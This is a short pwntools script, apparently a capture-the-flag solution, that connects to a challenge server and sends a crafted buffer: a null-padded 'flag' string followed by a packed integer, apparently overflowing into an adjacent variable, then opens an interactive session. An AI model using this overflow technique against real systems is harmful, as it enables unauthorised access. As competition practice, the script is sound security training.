#!/usr/bin/env python3
from pwn import *

io = remote("viewer.challs.pwnoh.io", 1337, ssl=True)
io.sendlineafter(b"> ", b"flag\x00".ljust(10, b'\x00') + p64(1))
io.interactive()
